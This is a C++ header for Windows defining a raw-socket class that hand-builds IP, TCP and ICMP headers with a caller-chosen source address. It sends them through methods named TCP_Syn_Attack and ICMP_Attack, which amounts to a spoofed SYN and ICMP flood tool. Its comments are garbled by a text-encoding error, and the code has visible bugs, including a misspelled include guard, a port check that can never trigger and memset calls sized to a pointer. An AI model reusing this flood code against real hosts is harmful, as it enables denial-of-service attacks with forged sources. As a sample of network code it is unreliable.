#ifndef _SOCKET_H_
#define _SCOKET_H_

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

#define MAXPORT		65535 
#define IP_VERSION_AND_HDRLEN_BIT		0b01000101
#define IP_FRAGMENT_BIT					0b0000001000000000
#define TCP_REGISTER_BIT				0b1000000000000010
#define ICMP_ID							0b00000000000000010000000100000000

typedef struct IPHEADHER {
	unsigned char		ip_VersionAndHdrLen;
	unsigned char		ip_TypeOfServices;
	unsigned short		ip_TotalLen;
	unsigned short		ip_ID;
	unsigned short		ip_Fragment;
	unsigned char		ip_TTL;
	unsigned char		ip_Protocol;
	unsigned short		ip_CheckSum;
	unsigned int		ip_SrcIP;
	unsigned int		IP_DstIP;
}ip_hdr;

typedef struct TCPHEADER {
	unsigned short tcp_SrcPort;
	unsigned short tcp_DstPort;
	unsigned int seqNum;
	unsigned int ackNum;
	unsigned short reg;
	unsigned short winSize;
	unsigned short checkSum;
	unsigned short urgentPtr;
}tcp_hdr;

typedef struct ICMPHEADER {
	unsigned char		icmp_Type;
	unsigned char		icmp_Code;
	unsigned short		icmp_Checksum;
	unsigned int		icmp_ID;
	unsigned int		icmp_Seq;
	unsigned int		data[7];
}icmp_hdr;

class RawSocket {
private:
	WSADATA wsaData;
	SOCKET rawSock = INVALID_SOCKET;
	sockaddr_in dstAddr;
	WORD wsaVersion = MAKEWORD(2, 2);
	BOOL optival = TRUE;
	int payLoad = 512;
	char startBuf[1000], * data;
	ip_hdr* ipHdr;
	tcp_hdr* tcpHdr;
	icmp_hdr* icmpHdr;

public:
	RawSocket(const char* srcIP, const char* dstIP, int protocol = IPPROTO_ICMP) {
		
		if (protocol == IPPROTO_ICMP)		IcmpSetting();
		else if (protocol == IPPROTO_TCP)	TcpSetting();
		
		//ip ��� ���� �Ҵ�
		ipHdr = new ip_hdr;
		memset(ipHdr, 0, sizeof(ipHdr));

		//Winsock �غ�(�ʱ�ȭ)
		auto result = WSAStartup(wsaVersion, &wsaData);
		if (result != 0) {
			printf("���� �غ� ����\n");
			exit(1);
		}

		//���� �ʱ�ȭ
		rawSock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if (rawSock == INVALID_SOCKET) {
			printf("���� �ʱ�ȭ ���� \n");
			exit(1);
		}

		//RawSocket IP, TCP ��� �ڵ����� ���� �ɼ� �߰�
		setsockopt(rawSock, IPPROTO_IP, IP_HDRINCL, (char*)&optival, sizeof(optival));

		//������ ���� ����
		dstAddr.sin_family = AF_INET;
		inet_pton(AF_INET, dstIP, &dstAddr.sin_addr);
		dstAddr.sin_port = htons(0);


		//IP ��� �� ����
		ipHdr = (ip_hdr*)startBuf; //sendto�� �����͸� ������ ���� ���� �ּ� ������ ����
		ipHdr->ip_VersionAndHdrLen = IP_VERSION_AND_HDRLEN_BIT;
		ipHdr->ip_TypeOfServices = 0;
		ipHdr->ip_TotalLen = htons(sizeof(ip_hdr) + sizeof(tcp_hdr) + payLoad);
		ipHdr->ip_TTL = 8;
		ipHdr->ip_ID = htons(2);
		ipHdr->ip_Fragment = IP_FRAGMENT_BIT;
		ipHdr->ip_Protocol = protocol;
		ipHdr->ip_CheckSum = 0;
		//IP ���
		ipHdr->ip_SrcIP = inet_addr(srcIP);
		ipHdr->IP_DstIP = inet_addr(dstIP);

		/*IP üũ��
		char checkIP[100];
		inet_ntop(AF_INET, &ipHdr->ip_SrcIP, checkIP, sizeof(checkIP));
		printf("SrcIP : %s \n", checkIP);
		inet_ntop(AF_INET, &ipHdr->IP_DstIP, checkIP, sizeof(checkIP));
		printf("SrcIP : %s \n", checkIP);
		*/

		
	};

	void TCP_Syn_Attack() {
		int size = sizeof(*ipHdr) + sizeof(*tcpHdr) + payLoad;
		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
		if (result == SOCKET_ERROR) {
			printf("RawSocket sendto Error \n");
			exit(1);
		}
	};

	void ICMP_Attack() {
		int size = sizeof(*ipHdr) + sizeof(*icmpHdr);
		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
		if (result == SOCKET_ERROR) {
			printf("RawSocket sendto Error \n");
			exit(1);
		}

		printf("[SYSTEM - SENDED_BYTE] : %d Bytes\n", result);
	};

private:
	void TcpSetting(const int srcPort = 0, const int dstPort = 0) {

		printf("[SYSTEM - PROTO] : TCP Ready ... \n");
		tcpHdr = new tcp_hdr;
		memset(tcpHdr, 0, sizeof(tcpHdr));

		//Port ��ȣ ���� üũ
		if ((0 > srcPort && MAXPORT < srcPort) || (0 > dstPort && MAXPORT < dstPort)) {
			printf("��Ʈ�� ���� �ȿ� ���� �ʽ��ϴ�. \n");
			exit(01);
		}

		//������ ��Ʈ ����
		dstAddr.sin_port = htons(dstPort);

		//TC ��� �� ����
		tcpHdr = (tcp_hdr*)(startBuf + sizeof(*ipHdr));
		tcpHdr->reg = TCP_REGISTER_BIT;
		tcpHdr->checkSum = 0;

		//TCP ���
		tcpHdr->tcp_SrcPort = htons(srcPort);
		tcpHdr->tcp_DstPort = htons(dstPort);

		/* TCP ��Ʈ Ȯ�ο�
		printf("SrcPort : %d \n", ntohs(tcpHdr->tcp_SrcPort));
		printf("SrcPort : %d \n", ntohs(tcpHdr->tcp_DstPort));
		*/

		//data �ּ� �� �Է�
		data = startBuf + sizeof(*ipHdr) + sizeof(*tcpHdr);

		printf("[SYSTEM - PROTO] : TCP Complete \n");
	}

	void IcmpSetting() {
		printf("[SYSTEM - PROTO] : ICMP Ready ... \n");
		icmpHdr = new icmp_hdr;
		int icmpSize = sizeof(*icmpHdr);

		memset(icmpHdr, 0, icmpSize);

		icmpHdr = (icmp_hdr*)(startBuf + sizeof(*ipHdr));
		icmpHdr->icmp_Type = 8;
		icmpHdr->icmp_Code = 0;
		icmpHdr->icmp_Checksum = 0;
		icmpHdr->icmp_ID = ICMP_ID;
		icmpHdr->icmp_Seq = 0;
		/* ICMP Header Size üũ��
		printf("[SYSTEM  - SIZE] : icmp - %d \n", sizeof(*icmpHdr));
		*/
		printf("[SYSTEM - PROTO] : ICMP Complete \n");
	}

	void ShowSocketAddr() {
		printf("ipHdr Address : %x \n", ipHdr);
		printf("tcpHdr Address : %x \n", tcpHdr);
		printf("data Address : %x \n", data);
	};

	void ShowMemberSize() {
		printf("IP_Header Size  : %d \n", sizeof(*ipHdr));
		printf("TCP_Header Size : %d \n", sizeof(*tcpHdr));
	};
};
#endif